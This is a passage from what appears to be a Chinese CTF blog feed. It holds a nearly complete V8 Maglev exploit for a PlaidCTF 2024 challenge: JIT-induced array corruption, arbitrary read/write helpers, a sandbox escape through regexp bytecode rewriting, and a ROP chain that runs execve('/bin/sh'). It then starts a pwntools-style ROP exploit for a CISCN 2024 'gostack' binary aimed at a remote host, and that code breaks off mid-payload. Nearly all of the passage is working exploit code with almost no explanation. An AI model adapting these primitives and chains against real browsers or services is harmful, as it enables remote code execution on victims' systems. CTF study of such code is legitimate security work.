arr.<span class="title function_">push</span>(<span class="number">1.1</span>);</span><br><span class="line">    arr2.<span class="title function_">push</span>(<span class="number">7.7</span>);</span><br><span class="line">    arr2.<span class="title function_">push</span>(<span class="number">7.7</span>);</span><br><span class="line">    arr2.<span class="title function_">push</span>(<span class="number">7.7</span>);</span><br><span class="line">    arr2.<span class="title function_">push</span>(<span class="number">7.7</span>);</span><br><span class="line">    arr2.<span class="title function_">push</span>(<span class="number">7.7</span>);</span><br><span class="line">    arr2.<span class="title function_">push</span>(<span class="number">3.4540680395689801e-308</span>);</span><br><span class="line">    arr2.<span class="title function_">push</span>(<span class="number">6.1075495069397581e-309</span>);</span><br><span class="line">    arr2.<span class="title function_">push</span>(<span class="number">8.4879838501182713e-314</span>);</span><br><span class="line">    arr2.<span class="title function_">push</span>(<span class="number">0.1</span>);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">% <span class="title class_">PrepareFunctionForOptimization</span>(f)</span><br><span class="line"><span class="title function_">f</span>();</span><br><span class="line"><span class="title function_">f</span>();</span><br><span class="line">% <span class="title class_">OptimizeMaglevOnNextCall</span>(f);</span><br><span class="line"></span><br><span class="line"><span class="comment">// for (var j = 0; j &lt; 10000; j++) &#123;</span></span><br><span class="line"><span class="comment">//     f();</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">arr = [];</span><br><span class="line">arr.<span class="title function_">push</span>(<span class="number">1.1</span>);</span><br><span class="line"></span><br><span class="line">arr2 = arr;</span><br><span class="line"><span class="keyword">let</span> float_arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>];</span><br><span class="line"><span class="keyword">let</span> obj_array = [float_arr, float_arr];</span><br><span class="line"><span class="title function_">f</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> cor = cor_arr[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// % DebugPrint(cor);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addrr</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    cor[<span class="number">23</span>] = <span class="title function_">p64</span>(<span class="number">10</span>, addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">u64</span>(float_arr[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addrrl</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    cor[<span class="number">23</span>] = <span class="title function_">p64</span>(<span class="number">10</span>, addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">u64_l</span>(float_arr[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addrw</span>(<span class="params">addr, valh, vall</span>) &#123;</span><br><span class="line">    cor[<span class="number">23</span>] = <span class="title function_">p64</span>(<span class="number">10</span>, addr + <span class="number">1</span>);</span><br><span class="line">    float_arr[<span class="number">0</span>] = <span class="title function_">p64</span>(valh, vall);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addrwl</span>(<span class="params">addr, val</span>) &#123;</span><br><span class="line">    cor[<span class="number">23</span>] = <span class="title function_">p64</span>(<span class="number">10</span>, addr + <span class="number">1</span>);</span><br><span class="line">    float_arr[<span class="number">0</span>] = <span class="title function_">p64</span>(<span class="number">0</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>沙箱逃逸</p>
<p><a class="link"   href="https://github.com/rycbar77/V8-Sandbox-Escape-via-Regexp" >https://github.com/rycbar77/V8-Sandbox-Escape-via-Regexp<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>exp</p>
<div class="code-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">const</span> dv = <span class="keyword">new</span> <span class="title class_">DataView</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">p64</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">arguments</span>.<span class="property">length</span> === <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// dv.setUint32(0, arguments[0] &amp; 0xFFFFFFFF, true);</span></span><br><span class="line">        <span class="comment">// dv.setUint32(0x4, parseInt(BigInt(arguments[0]) &gt;&gt; BigInt(32)), true);</span></span><br><span class="line">        dv.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, <span class="title class_">BigInt</span>(<span class="variable language_">arguments</span>[<span class="number">0</span>]), <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> dv.<span class="title function_">getFloat64</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">arguments</span>.<span class="property">length</span> === <span class="number">2</span>) &#123;</span><br><span class="line">        dv.<span class="title function_">setUint32</span>(<span class="number">0</span>, <span class="variable language_">arguments</span>[<span class="number">1</span>], <span class="literal">true</span>);</span><br><span class="line">        dv.<span class="title function_">setUint32</span>(<span class="number">0x4</span>, <span class="variable language_">arguments</span>[<span class="number">0</span>], <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> dv.<span class="title function_">getFloat64</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u64</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    dv.<span class="title function_">setFloat64</span>(<span class="number">0</span>, val, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">getBigUint64</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u64_l</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    dv.<span class="title function_">setFloat64</span>(<span class="number">0</span>, val, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u64_h</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    dv.<span class="title function_">setFloat64</span>(<span class="number">0</span>, val, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">getUint32</span>(<span class="number">0x4</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">gc_l</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">log</span>(<span class="string">&quot;major gc&quot;</span>);</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x7fe00000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">gc_s</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">log</span>(<span class="string">&quot;minor gc&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x1000000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sleep</span>(<span class="params">ms</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> <span class="built_in">setTimeout</span>(resolve, ms));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">x</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> x.<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">printhex</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">arguments</span>.<span class="property">length</span> === <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`\u001b[32m[+]Hex: \u001b[0m0x<span class="subst">$&#123;<span class="variable language_">arguments</span>[<span class="number">0</span>].toString(<span class="number">16</span>)&#125;</span>`</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">arguments</span>.<span class="property">length</span> === <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`\u001b[32m[+]<span class="subst">$&#123;<span class="variable language_">arguments</span>[<span class="number">0</span>]&#125;</span>: \u001b[0m0x<span class="subst">$&#123;<span class="variable language_">arguments</span>[<span class="number">1</span>].toString(<span class="number">16</span>)&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">log</span>(<span class="params"></span>) &#123;</span><br><span class="line">    output = <span class="string">`\u001b[32m[+]<span class="subst">$&#123;<span class="variable language_">arguments</span>[<span class="number">0</span>]&#125;</span>\u001b[0m`</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        output += <span class="variable language_">arguments</span>[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(output);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">warn</span>(<span class="params"></span>) &#123;</span><br><span class="line">    output = <span class="string">`\u001b[31m[+]<span class="subst">$&#123;<span class="variable language_">arguments</span>[<span class="number">0</span>]&#125;</span>\u001b[0m`</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        output += <span class="variable language_">arguments</span>[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(output);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">farrdump</span>(<span class="params">float_arr, start, end</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = start; i &lt; end; i++) &#123;</span><br><span class="line">        <span class="title function_">printhex</span>(<span class="string">`arr[<span class="subst">$&#123;i&#125;</span>]`</span>, <span class="title function_">u64</span>(float_arr[i]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">iarrdump</span>(<span class="params">int_arr, start, end</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = start; i &lt; end; i++) &#123;</span><br><span class="line">        <span class="title function_">printhex</span>(<span class="string">`arr[<span class="subst">$&#123;i&#125;</span>]`</span>, int_arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> cor_arr;</span><br><span class="line"><span class="keyword">let</span> arr = [];</span><br><span class="line"><span class="keyword">let</span> arr2 = arr;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;</span><br><span class="line">    cor_arr = [arr, arr];</span><br><span class="line">    arr2.<span class="title function_">push</span>(<span class="number">1.1</span>);</span><br><span class="line">    arr.<span class="title function_">push</span>(<span class="number">1.1</span>);</span><br><span class="line">    arr.<span class="title function_">push</span>(<span class="number">1.1</span>);</span><br><span class="line">    arr.<span class="title function_">push</span>(<span class="number">1.1</span>);</span><br><span class="line">    arr.<span class="title function_">push</span>(<span class="number">1.1</span>);</span><br><span class="line">    arr.<span class="title function_">push</span>(<span class="number">1.1</span>);</span><br><span class="line">    arr.<span class="title function_">push</span>(<span class="number">1.1</span>);</span><br><span class="line">    arr.<span class="title function_">push</span>(<span class="number">1.1</span>);</span><br><span class="line">    arr.<span class="title function_">push</span>(<span class="number">1.1</span>);</span><br><span class="line">    arr.<span class="title function_">push</span>(<span class="number">1.1</span>);</span><br><span class="line">    arr.<span class="title function_">push</span>(<span class="number">1.1</span>);</span><br><span class="line">    arr.<span class="title function_">push</span>(<span class="number">1.1</span>);</span><br><span class="line">    arr.<span class="title function_">push</span>(<span class="number">1.1</span>);</span><br><span class="line">    arr.<span class="title function_">push</span>(<span class="number">1.1</span>);</span><br><span class="line">    arr.<span class="title function_">push</span>(<span class="number">1.1</span>);</span><br><span class="line">    arr.<span class="title function_">push</span>(<span class="number">1.1</span>);</span><br><span class="line">    arr2.<span class="title function_">push</span>(<span class="number">7.7</span>);</span><br><span class="line">    arr2.<span class="title function_">push</span>(<span class="number">7.7</span>);</span><br><span class="line">    arr2.<span class="title function_">push</span>(<span class="number">7.7</span>);</span><br><span class="line">    arr2.<span class="title function_">push</span>(<span class="number">7.7</span>);</span><br><span class="line">    arr2.<span class="title function_">push</span>(<span class="number">7.7</span>);</span><br><span class="line">    arr2.<span class="title function_">push</span>(<span class="number">3.4540680395689801e-308</span>);</span><br><span class="line">    arr2.<span class="title function_">push</span>(<span class="number">6.1075495069397581e-309</span>);</span><br><span class="line">    arr2.<span class="title function_">push</span>(<span class="number">8.4879838501182713e-314</span>);</span><br><span class="line">    arr2.<span class="title function_">push</span>(<span class="number">0.1</span>);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">% <span class="title class_">PrepareFunctionForOptimization</span>(f)</span><br><span class="line"><span class="title function_">f</span>();</span><br><span class="line"><span class="title function_">f</span>();</span><br><span class="line">% <span class="title class_">OptimizeMaglevOnNextCall</span>(f);</span><br><span class="line"></span><br><span class="line"><span class="comment">// for (var j = 0; j &lt; 10000; j++) &#123;</span></span><br><span class="line"><span class="comment">//     f();</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">arr = [];</span><br><span class="line">arr.<span class="title function_">push</span>(<span class="number">1.1</span>);</span><br><span class="line"></span><br><span class="line">arr2 = arr;</span><br><span class="line"><span class="keyword">let</span> float_arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>];</span><br><span class="line"><span class="keyword">let</span> obj_array = [float_arr, float_arr];</span><br><span class="line"><span class="title function_">f</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> cor = cor_arr[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// % DebugPrint(cor);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addrr</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    cor[<span class="number">23</span>] = <span class="title function_">p64</span>(<span class="number">10</span>, addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">u64</span>(float_arr[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addrrl</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    cor[<span class="number">23</span>] = <span class="title function_">p64</span>(<span class="number">10</span>, addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">u64_l</span>(float_arr[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addrw</span>(<span class="params">addr, valh, vall</span>) &#123;</span><br><span class="line">    cor[<span class="number">23</span>] = <span class="title function_">p64</span>(<span class="number">10</span>, addr + <span class="number">1</span>);</span><br><span class="line">    float_arr[<span class="number">0</span>] = <span class="title function_">p64</span>(valh, vall);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addrwl</span>(<span class="params">addr, val</span>) &#123;</span><br><span class="line">    cor[<span class="number">23</span>] = <span class="title function_">p64</span>(<span class="number">10</span>, addr + <span class="number">1</span>);</span><br><span class="line">    float_arr[<span class="number">0</span>] = <span class="title function_">p64</span>(<span class="number">0</span>, val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// printhex(addrr(0x46791));</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> s = <span class="string">&quot;aaaa&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*/g</span>;</span><br><span class="line">obj_array[<span class="number">0</span>] = regex;</span><br><span class="line"></span><br><span class="line"><span class="title function_">log</span>(<span class="string">&quot;regex&quot;</span>);</span><br><span class="line"><span class="comment">// log(&quot;obj&quot;);</span></span><br><span class="line"><span class="comment">// % DebugPrint(obj_array);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> addr_regex = <span class="title function_">u64_l</span>(cor[<span class="number">25</span>]);</span><br><span class="line"><span class="keyword">let</span> data_addr = <span class="title function_">addrrl</span>(addr_regex + <span class="number">0x4</span>);</span><br><span class="line"><span class="title function_">printhex</span>(<span class="string">&quot;addr_regex&quot;</span>, addr_regex);</span><br><span class="line"><span class="title function_">printhex</span>(<span class="string">&quot;data_addr&quot;</span>, data_addr);</span><br><span class="line"></span><br><span class="line">regex.<span class="title function_">exec</span>(s);</span><br><span class="line"><span class="comment">// % DebugPrint(regex);</span></span><br><span class="line"><span class="comment">// % SystemBreak();</span></span><br><span class="line"><span class="keyword">let</span> bytecode = <span class="title function_">addrrl</span>(data_addr + <span class="number">0x14</span>);</span><br><span class="line"><span class="title function_">printhex</span>(<span class="string">&quot;bytecode&quot;</span>, bytecode);</span><br><span class="line"></span><br><span class="line"><span class="title function_">addrw</span>(data_addr + <span class="number">0x2f</span> - <span class="number">8</span>, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr1 = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">push_reg</span>(<span class="params">idx</span>) &#123;</span><br><span class="line">    arr1.<span class="title function_">push</span>((idx &lt;&lt; <span class="number">8</span>) &amp; <span class="number">0xffffff00</span> | <span class="number">0x03</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">pop_reg</span>(<span class="params">idx</span>) &#123;</span><br><span class="line">    arr1.<span class="title function_">push</span>((idx &lt;&lt; <span class="number">8</span>) &amp; <span class="number">0xffffff00</span> | <span class="number">0x0c</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">mov_reg1_to_reg2</span>(<span class="params">idx1, idx2</span>) &#123;</span><br><span class="line">    <span class="title function_">push_reg</span>(idx1);</span><br><span class="line">    <span class="title function_">pop_reg</span>(idx2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">advance_reg</span>(<span class="params">idx, value</span>) &#123;</span><br><span class="line">    arr1.<span class="title function_">push</span>((idx &lt;&lt; <span class="number">8</span>) &amp; <span class="number">0xffffff00</span> | <span class="number">0x09</span>);</span><br><span class="line">    arr1.<span class="title function_">push</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">set_reg</span>(<span class="params">idx, value</span>) &#123;</span><br><span class="line">    arr1.<span class="title function_">push</span>((idx &lt;&lt; <span class="number">8</span>) &amp; <span class="number">0xffffff00</span> | <span class="number">0x08</span>);</span><br><span class="line">    arr1.<span class="title function_">push</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">success</span>(<span class="params"></span>) &#123;</span><br><span class="line">    arr1.<span class="title function_">push</span>(<span class="number">0x0000000e</span>);</span><br><span class="line">    <span class="keyword">if</span> (arr1.<span class="property">length</span> % <span class="number">2</span> === <span class="number">1</span>) &#123;</span><br><span class="line">        arr1.<span class="title function_">push</span>(<span class="number">0x0000000e</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> idx = <span class="number">0x52</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">add_gadget</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    <span class="title function_">mov_reg1_to_reg2</span>(<span class="number">3</span>, <span class="number">5</span>);</span><br><span class="line">    <span class="title function_">advance_reg</span>(<span class="number">5</span>, addr);</span><br><span class="line">    <span class="title function_">mov_reg1_to_reg2</span>(<span class="number">5</span>, idx++);</span><br><span class="line">    <span class="title function_">mov_reg1_to_reg2</span>(<span class="number">4</span>, idx++);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">mov_reg1_to_reg2</span>(<span class="number">0x53</span>, <span class="number">4</span>);</span><br><span class="line"><span class="title function_">mov_reg1_to_reg2</span>(<span class="number">0x52</span>, <span class="number">3</span>);</span><br><span class="line"><span class="title function_">advance_reg</span>(<span class="number">3</span>, <span class="number">0xFE9BBCE0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">add_gadget</span>(<span class="number">0x11ab9fa</span>); <span class="comment">//pop rsi; ret;</span></span><br><span class="line"><span class="title function_">add_gadget</span>(<span class="number">0x2644000</span>);</span><br><span class="line"><span class="title function_">add_gadget</span>(<span class="number">0x1082d5e</span>); <span class="comment">//pop rdx; ret;</span></span><br><span class="line"><span class="title function_">set_reg</span>(idx++, <span class="number">0x6e69622f</span>);</span><br><span class="line"><span class="title function_">set_reg</span>(idx++, <span class="number">0x68732f</span>);</span><br><span class="line"><span class="title function_">add_gadget</span>(<span class="number">0x1636fa3</span>); <span class="comment">//mov qword ptr [rsi], rdx; ret;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">add_gadget</span>(<span class="number">0x14b44dc</span>); <span class="comment">//pop rdi; ret;</span></span><br><span class="line"><span class="title function_">add_gadget</span>(<span class="number">0x2644000</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">add_gadget</span>(<span class="number">0x11ab9fa</span>); <span class="comment">//pop rsi; ret;</span></span><br><span class="line"><span class="title function_">set_reg</span>(idx++, <span class="number">0</span>);</span><br><span class="line"><span class="title function_">set_reg</span>(idx++, <span class="number">0</span>);</span><br><span class="line"><span class="title function_">add_gadget</span>(<span class="number">0x1082d5e</span>); <span class="comment">//pop rdx; ret;</span></span><br><span class="line"><span class="title function_">set_reg</span>(idx++, <span class="number">0</span>);</span><br><span class="line"><span class="title function_">set_reg</span>(idx++, <span class="number">0</span>);</span><br><span class="line"><span class="title function_">add_gadget</span>(<span class="number">0x11091b0</span>); <span class="comment">//pop rax; ret;</span></span><br><span class="line"><span class="title function_">set_reg</span>(idx++, <span class="number">0x3b</span>);</span><br><span class="line"><span class="title function_">set_reg</span>(idx++, <span class="number">0</span>);</span><br><span class="line"><span class="title function_">add_gadget</span>(<span class="number">0x108492d</span>); <span class="comment">//syscall;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// add_gadget(0x11091b0); //pop rax; ret;</span></span><br><span class="line"><span class="comment">// add_gadget(0x14b44dc); //pop rdi; ret;</span></span><br><span class="line"><span class="comment">// add_gadget(0x11ab9fa); //pop rsi; ret;</span></span><br><span class="line"><span class="comment">// add_gadget(0x1082d5e); //pop rdx; ret;</span></span><br><span class="line"><span class="comment">// add_gadget(0x108492d); //syscall;</span></span><br><span class="line"><span class="comment">// add_gadget(0x1636fa3); //mov qword ptr [rsi], rdx; ret;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">success</span>();</span><br><span class="line">cor[<span class="number">23</span>] = <span class="title function_">p64</span>(<span class="number">50</span>, bytecode + <span class="number">0x7</span> + <span class="number">1</span>);</span><br><span class="line"><span class="comment">// % DebugPrint(float_arr);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr1idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">let</span> flarridx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (; arr1idx &lt; arr1.<span class="property">length</span> - <span class="number">1</span>; flarridx += <span class="number">1</span>) &#123;</span><br><span class="line">    float_arr[flarridx] = <span class="title function_">p64</span>(arr1[arr1idx + <span class="number">1</span>], arr1[arr1idx]);</span><br><span class="line">    arr1idx += <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// % SystemBreak();</span></span><br><span class="line">regex.<span class="title function_">exec</span>(s);</span><br><span class="line"></span><br><span class="line"><span class="comment">// % SystemBreak();</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202503/06/PlaidCTF2024-maglev/image-20250306165557487.png"
                      alt="image-20250306165557487"
                ></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>v8</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn-2024</title>
    <url>/202405/19/ciscn-2024/</url>
    <content><![CDATA[<p>先贴个exp，有空补充详细</p>
<h1 id="gostack"><a href="#gostack" class="headerlink" title="gostack"></a>gostack</h1><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;122&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="number">1</span>:</span><br><span class="line">    addr = <span class="string">&#x27;8.147.129.121:30388&#x27;</span></span><br><span class="line">    host = addr.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    gift.io = remote(host[<span class="number">0</span>], host[<span class="number">1</span>])</span><br><span class="line">    gift.debug = <span class="literal">False</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gift.io = process(<span class="string">&#x27;./gostack&#x27;</span>)</span><br><span class="line">init_x64_context(gift.io, gift)</span><br><span class="line">load_libc(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">libc: ELF = gift[<span class="string">&#x27;libc&#x27;</span>]</span><br><span class="line">gift.elf = ELF(<span class="string">&#x27;./gostack&#x27;</span>)</span><br><span class="line">cmd = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b *0x4a0a9e</span></span><br><span class="line"><span class="string">    b *0x4A09C6</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># launch_gdb(cmd)</span></span><br><span class="line"></span><br><span class="line">CG.set_find_area(<span class="literal">True</span>, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">sys_write = <span class="number">0x46A380</span></span><br><span class="line">sys_read = <span class="number">0x46A180</span></span><br><span class="line">sys_mmap = <span class="number">0x46A980</span></span><br><span class="line">syscall = <span class="number">0x404043</span></span><br><span class="line">sh = <span class="number">0x4A3423</span></span><br><span class="line"><span class="comment"># 4a18a5 : pop rdi ; pop r14 ; pop r13 ; pop r12 ; pop rbp ; pop rbx ; ret</span></span><br><span class="line">rdi_6 = <span class="number">0x4A18A5</span></span><br><span class="line">rax = <span class="number">0x40F984</span></span><br><span class="line">rbx = <span class="number">0x40C321</span></span><br><span class="line">rcx = <span class="number">0x420D6D</span></span><br><span class="line">rsi = <span class="number">0x42138A</span></span><br><span class="line">rdx = <span class="number">0x4944EC</span></span><br><span class="line">fmt_printf = <span class="number">0x4914C0</span></span><br><span class="line"><span class="comment"># 49172f : pop rax ; mov rcx, rdx ; call rsi</span></span><br><span class="line"><span class="comment"># 4600c7 : xchg rcx, rax ; ret</span></span><br><span class="line">xchg_rcx_rax = <span class="number">0x4600C7</span></span><br><span class="line"><span class="comment"># 460147 : xchg r8, rax ; ret</span></span><br><span class="line">xchg_r8_rax = <span class="number">0x460147</span></span><br><span class="line">prax_mrcx_rdx_callrsi = <span class="number">0x49172F</span></span><br><span class="line">syscall_ret = <span class="number">0x4616C9</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;Input your magic message :&#x27;</span>)</span><br><span class="line">payload = (</span><br><span class="line">    <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    + cyclic(<span class="number">0x100</span> - <span class="number">0x8</span>)</span><br><span class="line">    + p64_ex(<span class="number">0xC00000C600</span>)</span><br><span class="line">    + p64_ex(<span class="number">0x108</span>)</span><br><span class="line">    + p64_ex(<span class="number">0x4AA800</span>)</span><br><span class="line">    + p64_ex(<span class="number">0xC000012360</span>)</span><br><span class="line">)</span><br><span class="line">payload = payload.ljust(<span class="number">0x1D0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span 